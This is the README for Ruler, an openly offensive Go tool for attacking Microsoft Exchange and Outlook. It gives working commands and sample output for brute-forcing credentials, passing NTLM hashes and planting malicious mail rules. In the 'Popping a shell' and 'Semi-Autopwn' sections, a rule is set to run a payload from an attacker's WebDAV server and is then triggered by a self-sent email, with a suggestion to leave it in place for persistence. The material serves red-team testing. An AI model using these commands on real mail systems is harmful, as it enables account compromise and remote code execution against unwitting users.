# Introduction

Ruler is a tool that allows you to interact with Exchange servers through the MAPI/HTTP protocol. The main aim is abuse the client-side Outlook mail rules as described in: [Silentbreak blog]

Silentbreak did a great job with this attack and it has served us well. The only downside has been that it takes time to get setup. Cloning a mailbox into a new instance of Outlook can be time consuming. And then there is all the clicking it takes to get a mailrule created. Wouldn't the command line version of this attack be great? And that is how Ruler was born.

The full low-down on how Ruler was implemented and some background regarding MAPI can be found in our blog post: [SensePost blog]

For a demo of it in action: [Ruler on YouTube]

## What does it do?

Ruler has multiple functions and more are planned. These include

* Enumerate valid users
* View currently configured mail rules
* Create new malicious mail rules
* Delete mail rules

Ruler attempts to be semi-smart when it comes to interacting with Exchange and uses the Autodiscover service (just as your Outlook client would) to discover the relevant information.

# Getting the Code

Ruler is written in Go so you'll need to have Go setup to run/build the project

Get it through Go:
```
go get github.com/sensepost/ruler
```

You can now run the app through ```go run``` if you wish:
```
go run ruler.go -h
```

Or build it (the prefered option):

The first step as always is to clone the repo :
```
git clone https://github.com/sensepost/ruler.git
```

Ensure you have the dependencies (go get is the easiest option, otherwise clone the repos into your GOPATH):
```
go get github.com/urfave/cli
go get github.com/staaldraad/go-ntlm/ntlm
```
Then build it
```
go build
```

# Interacting with Exchange

~~It is important to note that for now this only works with the newer MAPI/HTTP used for OutlookAnywhere. The older RPC/HTTP which MAPI replaces is not supported and may possibly not be supported.~~ RPC/HTTP support has also been included, with Ruler favouring MAPI/HTTP. If MAPI/HTTP fails, an attempt will be made to use RPC/HTTP. You can also force RPC/HTTP by supplying the ```--rpc``` flag.

As mentioned before there are multiple functions to Ruler. In most cases you'll want to first find a set of valid credentials. Do this however you wish, Phishing, Wifi+Mana or brute-force.

# Basic Usage

Ruler has 5 basic commands, these are:

* display -- list all the current rules
* add -- add a rule
* delete -- delete a rule
* brute -- brute force credentials
* help -- show the help screen

There are a few global flags that should be used with most commands, while each command has sub-flags. For details on these, use the **help** command.

```
NAME:
   ruler - A tool to abuse Exchange Services

USAGE:
   ruler [global options] command [command options] [arguments...]

VERSION:
   2.0

DESCRIPTION:
            _
 _ __ _   _| | ___ _ __
| '__| | | | |/ _ \ '__|
| |  | |_| | |  __/ |
|_|   \__,_|_|\___|_|

A tool by @sensepost to abuse Exchange Services.

AUTHOR:
   Etienne Stalmans <etienne@sensepost.com>

COMMANDS:
     add, a      add a new rule
     delete, r   delete an existing rule
     display, d  display all existing rules
     check, c    Check if the credentials work and we can interact with the mailbox
     brute, b    Do a bruteforce attack against the autodiscover service to find valid username/passwords
     abk         Interact with the Global Address Book
     help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
    --domain value, -d value    A domain for the user (usually required for domain\username)
    --username value, -u value  A valid username
    --password value, -p value  A valid password
    --hash value                A NT hash for pass the hash (NTLMv1)
    --email value, -e value     The target's email address
    --url value                 If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml
    --insecure, -k              Ignore server SSL certificate errors
    --encrypt                   Use NTLM auth on the RPC level - some environments require this
    --basic, -b                 Force Basic authentication
    --admin                     Login as an admin
    --rpc                       Force RPC/HTTP rather than MAPI/HTTP
    --verbose                   Be verbose and show some of thei inner workings
    --help, -h                  show help
    --version, -v               print the version
```

## Brute-force for credentials

If you go the brute-force route, Ruler is your friend. It has a built-in brute-forcer which does a semi-decent job of finding creds.

```
./ruler --domain targetdomain.com brute --users /path/to/user.txt -passwords /path/to/passwords.txt
```
You should see your brute-force in action:

```
./ruler --domain evilcorp.ninja --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose

[*] Starting bruteforce
[x] Failed: cindy.baker:P@ssw0rd
[x] Failed: henry.hammond:P@ssw0rd
[x] Failed: john.ford:P@ssw0rd
[x] Failed: cindy.baker:August2016
[x] Failed: henry.hammond:August2016
[+] Success: john.ford:August2016
[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
[x] Failed: cindy.baker:Evilcorp@2016
[x] Failed: henry.hammond:Evilcorp@2016
[x] Failed: cindy.baker:3V1lc0rp
[x] Failed: henry.hammond:3V1lc0rp
[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
[x] Failed: henry.hammond:Password1
[+] Success: cindy.baker:Password1
[x] Failed: henry.hammond:Password!2016
[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
[x] Failed: henry.hammond:SensePost1
[x] Failed: henry.hammond:Lekker
[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
[x] Failed: henry.hammond:Eish
```

Alternatively, you can specify a userpass file with the ```--userpass``` option. The userpass file should be colon-delimited with one pair of credentials per line:

```
$ cat userpass.txt
john.ford:August2016
henry.hammond:Password!2016
cindy.baker:Password1

./ruler --domain evilcorp.ninja --insecure brute --userpass userpass.txt -v 

[*] Starting bruteforce
[+] Success: john.ford:August2016
[x] Failed: henry.hammond:Password!2016
[+] Success: cindy.baker:Password1
```

There are a few other flags that work with ```brute```

These are:
* --stop _//stop on the first valid username:password combo_
* --delay _//how long to wait between multiple password guesses_
* --attempts _//how many attempts before we delay (attempts per user)_
* --insecure _//if the Exchange server has a bad SSL cerificate_
* --verbose      _//be verbose and show failed attempts_

## The autodiscover service
While Ruler makes a best effort to "autodiscover" the necessary settings, you may still run into instances of it failing. The common causes are:
* autodiscover deployed over http and not https (we default to https as this is more common)
* No autodiscover DNS record
* Authentication failing

If you encounter an Exchange server where the Autodiscover service is failing, you can manually specify the Autodiscover URL:

``` ./ruler --url http://autodiscover.somedomain.com/autodiscover/autodiscover.xml ```

If you run into issues with Authentication (and you know the creds are correct), you can try and force the use of basic authentication with the global ```--basic```

The global ```--verbose``` flag will also give you some insight into the process being used by the autodiscover service.

## PtH - Passing the hash

Ruler has support for PtH attacks, allowing you to reuse valid NTLM hashes (think responder, mimikatz, mana-eap) instead of a password. Simply provide the hash instead of a password and you are good to go. To provide the hash, use the global flag ```--hash```.

```
./ruler --domain evilcorp --username validuser --hash 71bc15c57d836a663ed0b02631d300be --email user@domain.com display
```

## Display existing rules / verify account

Once you have a set of credentials you can target the user's mailbox. Here you'll need to know their email address (address book searching is in the planned extension).

```
./ruler --domain targetdomain.com --email user@targetdomain.com --username username --password password display
```

Output:
```
./ruler --domain evilcorp.ninja --username john.ford --password August2016 --email john.ford@evilcorp.ninja display

[*] Retrieving MAPI info
[*] Doing Autodiscover for domain
[+] MAPI URL found:  https://mail.evilcorp.ninja/mapi/emsmdb/?MailboxId=7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja
[+] User DN:  /o=Evilcorp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford
[*] Got Context, Doing ROPLogin
[*] And we are authenticated
[*] Openning the Inbox
[+] Retrieving Rules
[+] Found 0 rules

```

## Delete existing rules (clean up after  yourself)
To delete rules, use the ruleId displayed next to the rule name (000000df1)

```
./ruler --domain targetdomain.com --email user@targetdomain.com --username username --password password delete --id 000000df1
```

# Popping a shell

Now the fun part. Your initial setup is the same as outlined in the [Silentbreak blog], setup your webdav server to host your payload.

To create the new rule user Ruler and:

```
./ruler --domain targetdomain.com --email user@targetdomain.com --username username --password password add --location "\\\\yourserver\\webdav\\shell.bat" --trigger "pop a shell" --name maliciousrule
```

The various parts:
* `--location` _this is the location of your remote shell *note the double slashes* (or c:/Windows/system32/calc.exe)_
* `--trigger` _the string within the subject you want to trigger the rule_
* `--name` _a name for your rule_


Output:
```
[*] Retrieving MAPI info
[*] Doing Autodiscover for domain
[+] MAPI URL found:  https://mail.evilcorp.ninja/mapi/emsmdb/?MailboxId=7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja
[+] User DN:  /o=Evilcorp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford
[*] Got Context, Doing ROPLogin
[*] And we are authenticated
[*] Openning the Inbox
[*] Adding Rule
[*] Rule Added. Fetching list of rules...
[+] Found 1 rules
Rule: shell RuleID: 01000000127380b1
```

You should now be able to send an email to your target with the trigger string in the subject line. From testing the mailrule is synchronised across nearly instantaniously, so in most cases you should be able to get a shell almost immediatly, assuming outlook is open and connected.

# Semi-Autopwn

If you want to automate the triggering of the rule, Ruler is able to create a new message in the user's inbox, using their own email address. This means you no longer need to send an email to your target. Simply use the ```--send``` flag when creating your rule, and Ruler will wait 30seconds for your rules to synchronise (adjust this in the source if you think 30s is too long/short) and then send an email via MAPI.

```
[*] Retrieving MAPI/HTTP info
[*] Doing Autodiscover for domain
[*] Autodiscover step 0 - URL: https://outlook.com/autodiscover/autodiscover.xml
[+] MAPI URL found:  https://outlook.office365.com/mapi/emsmdb/?MailboxId=0003bffd-fef9-fb24-0000-000000000000@outlook.com
[+] User DN:  /o=First Organization/ou=Exchange Administrative Group(FYDIBOHF23SPDLT)/cn=Recipients/cn=0003BFFDFEF9FB24
[*] Got Context, Doing ROPLogin
[*] And we are authenticated
[*] Openning the Inbox
[*] Adding Rule
[*] Rule Added. Fetching list of rules...
[+] Found 1 rules
Rule: autopop RuleID: 010000000c4baa84
[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)
[*] Sending email
[*] Message sent, your shell should trigger shortly.
[*] And disconnecting from server
```

Enjoy your shell and don't forget to clean-up after yourself by deleting the rule (or leave it for persistence).

## A note about RPC

RPC/HTTP usually works through a RPC/HTTP proxy, this requires NTLM authentication. By default, Ruler takes care of this. There is however the option to have additional security enabled for Exchange, where Encryption and Integrity checking is enabled on RPC. This requires addional auth to happen on the RPC layer (inside the already NTLM authenticated HTTP channel). To force this, use the ```--encrypt``` flag. Ruler will try and warn you that this is required, if it is able to detect an issue. Alternatively just use this flag when in doubt.

[Silentbreak blog]: <https://silentbreaksecurity.com/malicious-outlook-rules/>
[SensePost blog]: <https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/>
[Ruler on YouTube]:<https://www.youtube.com/watch?v=Epk28fEw2Vk>
